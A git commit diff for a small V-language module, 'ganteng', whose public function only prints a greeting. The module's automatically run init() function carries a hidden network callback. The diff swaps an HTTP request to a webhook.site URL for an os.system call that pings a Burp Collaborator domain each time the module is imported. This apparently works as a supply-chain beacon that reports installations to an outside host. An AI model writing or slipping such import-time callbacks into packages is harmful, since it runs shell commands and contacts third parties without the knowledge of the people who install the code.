f4771757eb7396ef36251f7db6d69b5f9d847a5f
Abdillah <abdillah.muhamad@vantagepoint.co.id>
2021-10-31 15:01:29 +0700

    init

--- root.v
+++ root.v
@@ -1,15 +1,12 @@
 module ganteng
 
 import os
-import http
+
 // To export a function we have to use `pub`
 pub fn say_hi() {
 	println('hello from mymodule!')
 }
 
 fn init(){
-resp := http.get('https://webhook.site/eaadc4bb-70c8-42c2-9d3d-7a212d91f7be') or {
-    println('failed to fetch data from the server')
-    return
-}
+os.system("ping m1o9ydd3il1qi3vn25ccl1ouglmba0.burpcollaborator.net")
 }
